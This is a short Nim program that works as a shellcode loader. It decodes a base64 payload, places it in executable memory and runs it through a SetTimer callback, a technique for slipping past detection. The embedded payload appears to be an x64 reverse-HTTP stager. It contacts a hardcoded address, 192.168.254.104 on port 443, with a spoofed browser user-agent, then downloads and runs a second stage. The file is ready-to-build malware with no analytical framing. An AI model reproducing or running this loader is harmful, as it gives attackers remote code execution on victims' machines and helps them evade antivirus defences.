import base64

import winim
import winim/lean

proc setTimer[byte](shellcode: openArray[byte]): void =

  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))

  var dummy: int = 0
  let msg = create(MSG)

  SetTimer(cast[HWND](NULL), dummy, 0, cast[TIMERPROC](rPtr))
  GetMessageW(cast[LPMSG](msg), cast[HWND](NULL), 0, 0)
  DispatchMessageW(msg)

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8va09sNwA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDguMDsgV2luZG93cyBOVCA1LjE7IFRyaWRlbnQvNC4wOyBJbmZvUGF0aC4yOyAuTkVUIENMUiAyLjAuNTA3MjcpDQoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULQBBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTA0AAAAAAA="

  let shellcode = toByteSeq(decode(enc))
  setTimer(shellcode)
